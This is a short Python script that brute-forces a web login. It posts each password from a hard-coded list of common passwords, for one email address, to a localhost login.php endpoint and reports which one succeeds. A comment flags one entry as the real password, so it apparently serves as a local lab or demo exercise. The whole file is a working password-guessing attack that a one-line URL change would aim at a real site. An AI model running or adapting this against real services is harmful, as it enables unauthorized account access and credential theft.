import requests
import json

email = "goku@gmail.com"
login_url = "http://localhost:8000/login.php"
wordlist = [
    "password123", "123456", "letmein", "qwerty", "monkey", "dragon",
    "sunshine", "iloveyou", "princess", "football",
    "zingerburger",  # <-- real password
    "baseball", "welcome", "master", "hello123", "freedom","test"
]

for password in wordlist:
    payload = {"email": email, "password": password}
    headers = {"Content-Type": "application/json"}
    response = requests.post(login_url, headers=headers, data=json.dumps(payload))
    
    try:
        result = response.json()
    except Exception:
        print(f"Invalid JSON response for password: {password}")
        continue

    if result.get("status") == "success":
        print(f"Password found! Email: {email} Password: {password}")
        break
    else:
        print(f"Tried password: {password} - Failed")
